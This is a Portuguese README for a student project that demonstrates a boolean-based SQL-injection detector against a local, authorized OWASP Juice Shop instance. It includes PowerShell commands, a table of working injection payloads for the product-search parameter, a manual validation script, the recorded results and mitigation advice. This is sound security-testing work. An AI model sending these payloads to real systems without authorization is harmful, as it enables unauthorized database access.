# Demonstração do MVP SQLi — Windows 11

O controle positivo e negativo SQLite está em [CONTROLE_NEGATIVO.md](CONTROLE_NEGATIVO.md).
Ele usa o mesmo plano e classificador, acrescentando dois caminhos locais
suportados; o procedimento do Juice Shop abaixo permanece válido.

Escopo: somente o Juice Shop local autorizado, sem Docker. O scanner mantém
o cliente HTTP, os limites de loopback e a CLI das etapas anteriores. Nenhuma
dependência foi acrescentada. XSS e exposição de arquivos não estão implementados.

## Preparação

Use PowerShell e entre na pasta do projeto:

```powershell
Set-Location -LiteralPath 'C:\Pessoal\Portfolio\SIN451'
```

O ambiente Python e o Juice Shop já foram instalados. Somente se estiver
preparando outra cópia do projeto, execute:

```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -File scripts/setup-python.ps1
powershell.exe -NoProfile -ExecutionPolicy Bypass -File scripts/setup-juice-shop.ps1
```

A instalação exige acesso à internet; os testes e a demonstração usam loopback.
Não reinstale o laboratório enquanto sua instância estiver executando.

Inicie o laboratório se a porta 3000 estiver livre:

```powershell
if (-not (Get-NetTCPConnection -LocalPort 3000 -State Listen -ErrorAction SilentlyContinue)) {
    powershell.exe -NoProfile -ExecutionPolicy Bypass -File scripts/start-juice-shop.ps1 -Background
}
Get-NetTCPConnection -LocalPort 3000 -State Listen | Select-Object LocalAddress, LocalPort, OwningProcess
```

Espere a aplicação concluir a inicialização. O endereço de escuta esperado é
`127.0.0.1:3000`. Se outro serviço ocupar essa porta, identifique-o antes de
prosseguir. Os logs do laboratório estão em `lab/juice-shop.stdout.log` e
`lab/juice-shop.stderr.log`. O PID fica em `lab/juice-shop.pid`.

## Executar a demonstração

```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -File scripts/demo-sqli.ps1
```

O script executa duas referências normais e depois a sequência SQLi de dez
requisições. Gera `reports/demo-baseline.json` e `reports/demo-sqli.json`.
São doze GETs no total, com intervalo mínimo de 0,2 segundo por execução.
O script mostra a classificação observada; ele não força um resultado positivo.

Para executar apenas o detector, sem o script:

```powershell
.\.venv\Scripts\python.exe main.py "http://localhost:3000/rest/products/search?q=apple" --module sqli --samples 2 --max-requests 10 --output reports/demo-sqli.json
```

Para inspecionar o resultado:

```powershell
$report = Get-Content -Raw -Encoding UTF8 reports/demo-sqli.json | ConvertFrom-Json
$report.assessment | Format-List
$report.probes | Format-Table request_id, role, product_count, sql_error_signatures
$report.findings | Format-List title, status, confidence, evidence_request_ids, rationale, potential_impact, recommended_mitigation
```

## Explicar o experimento

O endpoint é `GET /rest/products/search`, com o parâmetro `q`. Ele retorna
produtos públicos em JSON. A inspeção de `lab/juice-shop_20.3.0/routes/search.ts`
identificou a concatenação de `criteria` na consulta de produtos. A análise
automática usa as respostas HTTP, sem depender da leitura desse código-fonte.

| Requisição | Papel | Valor de q |
| --- | --- | --- |
| 1 e 2 | Referências | `apple` |
| 3 | Sonda de sintaxe | `apple'` |
| 4 | Controle de escape | `apple''` |
| 5 | Controle textual | `apple AND 17=17` |
| 6 | Condição verdadeira | `apple%' AND (17=17) AND '%' LIKE '%` |
| 7 | Condição falsa | `apple%' AND (17=18) AND '%' LIKE '%` |
| 8 | Segunda condição verdadeira | `apple%' AND (23=23) AND '%' LIKE '%` |
| 9 | Segunda condição falsa | `apple%' AND (23=24) AND '%' LIKE '%` |
| 10 | Recuperação | `apple` |

O payload encerra o literal do LIKE, insere uma condição e reabre um literal.
A construção preserva as alternativas de busca por nome/descrição e o filtro
de produtos não excluídos. Não usa UNION, comentários, consultas empilhadas,
atrasos intencionais, tabelas de usuários ou operações de escrita.

Para confirmar, **todos** os critérios devem passar:

- Todas as requisições concluídas; referências válidas, não vazias e estáveis.
- As duas condições verdadeiras preservam o conjunto de IDs da referência.
- As duas condições falsas retornam JSON válido com zero produtos.
- A aspa gera erro SQL identificado, ausente das referências e dos controles.
- Os controles de escape e texto retornam JSON válido com zero produtos.
- A referência final recupera o mesmo conjunto de IDs.

O detector interpreta a estrutura JSON e calcula SHA-256 dos IDs ordenados;
variações de descrição, ordem ou tamanho não constituem confirmação por si só.
O relatório também conserva comparações HTTP de status, tamanho, corpo e amostra,
mas elas não substituem os controles semânticos.

Referência metodológica: [OWASP WSTG — Testing for SQL Injection](https://wstg.owasp.org/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection/),
especialmente controles de sintaxe e condições booleanas.

## Validação manual independente

Este trecho usa o cliente do PowerShell e mostra somente IDs públicos e
contagens, sem gravar os corpos das respostas:

```powershell
$endpoint = 'http://localhost:3000/rest/products/search'
function Read-ProductIds([string]$Value) {
    $encoded = [uri]::EscapeDataString($Value)
    $reply = Invoke-RestMethod -Method Get -TimeoutSec 5 -Uri "${endpoint}?q=$encoded"
    @($reply.data | ForEach-Object { $_.id } | Sort-Object)
}
$normalIds = @(Read-ProductIds 'apple')
$trueIds = @(Read-ProductIds "apple%' AND (17=17) AND '%' LIKE '%")
$falseIds = @(Read-ProductIds "apple%' AND (17=18) AND '%' LIKE '%")
[pscustomobject]@{ Caso='normal'; Quantidade=$normalIds.Count; IDs=($normalIds -join ',') }
[pscustomobject]@{ Caso='verdadeiro'; Quantidade=$trueIds.Count; IDs=($trueIds -join ',') }
[pscustomobject]@{ Caso='falso'; Quantidade=$falseIds.Count; IDs=($falseIds -join ',') }
if ($normalIds.Count -eq 0 -or $falseIds.Count -ne 0 -or (($normalIds -join ',') -ne ($trueIds -join ','))) {
    throw 'O comportamento esperado nao foi reproduzido. Consulte o relatorio; nao assuma confirmacao.'
}
```

## Resultado real e interpretação

Na instalação local 20.3.0, em 27/10/2026 às 11h41 (America/Sao_Paulo), as referências e condições verdadeiras
retornaram **3 produtos**, os controles e condições falsas retornaram **0**,
e a sonda de aspa retornou **HTTP 500 com SQLITE_ERROR**. A referência final
recuperou os mesmos três produtos. Resultado: **1 achado confirmed, confiança high**,
restrito à alteração booleana da consulta de produtos no parâmetro `q`.

O relatório real preservado no Git está em
[evidencias/sqli-2026-10-27.json](evidencias/sqli-2026-10-27.json).
Ele contém os valores de entrada, URLs codificadas, horários UTC, status,
tamanhos, hashes de corpo e conjunto de IDs, contagens, assinaturas SQL,
critérios, justificativa, impacto e mitigação. Corpos HTTP, stack traces,
cookies, nomes de produtos e credenciais não são gravados pelo scanner.

| Resultado | Significado |
| --- | --- |
| `confirmed` | Todos os controles e os dois pares demonstram a alteração booleana neste endpoint |
| `suspected` | Erro SQL diferencial ou par coerente, com controles insuficientes para confirmação |
| `not_detected` | Este plano não demonstrou SQLi; não é uma declaração de segurança |
| `inconclusive` | Coleta incompleta, resposta incompatível ou referência inadequada sem indício SQL suficiente |

Erro HTTP genérico ou diferenças de tamanho não geram achado por si só.
Erro SQL isolado pode gerar apenas suspeita. Falhas de transporte são registradas
e interrompem a coleta. O status resumido `completed` significa transporte
concluído; a conclusão de segurança fica em `assessment.outcome`.

Acesso a usuários/credenciais, autenticação, extração de outros dados e escrita
no banco **não foram testados**. O desafio de extração por UNION do placar do
Juice Shop não é o objetivo; a demonstração não depende de resolvê-lo.
No Juice Shop, o perfil cobre esse caminho e um único `q` de referência simples;
não faz descoberta automática nem afirma detectar todos os tipos de SQLi.
As limitações de timeout e tamanho das etapas anteriores continuam válidas.

Mitigação: consultas parametrizadas ou bindings do ORM no lugar da concatenação
do parâmetro e respostas de erro sem detalhes internos do banco.

## Testes e códigos de saída

```powershell
.\.venv\Scripts\python.exe -m pytest -q
.\.venv\Scripts\python.exe -m pip check
```

**81 testes passaram**, incluindo SQLite real em memória com consulta vulnerável
e parametrizada, SQL error isolado, erro HTTP genérico, referências instáveis,
IDs diferentes, referências vazias, HTML genérico, JSON inválido, falha de coleta,
recuperação ausente, orçamento, validação de URL e compatibilidade da CLI anterior.

Código 0 indica execução concluída e JSON gravado, inclusive para `suspected` e
`not_detected`. Código 1 indica erro de execução/gravação ou resultado
`inconclusive`; código 2 indica invocação inválida, bloqueada antes da rede.
Um HTTP 500 esperado na sonda de aspa é evidência, não falha de transporte.
Com `--samples N`, o orçamento deve ser de pelo menos `N + 8`, com `N >= 2`.
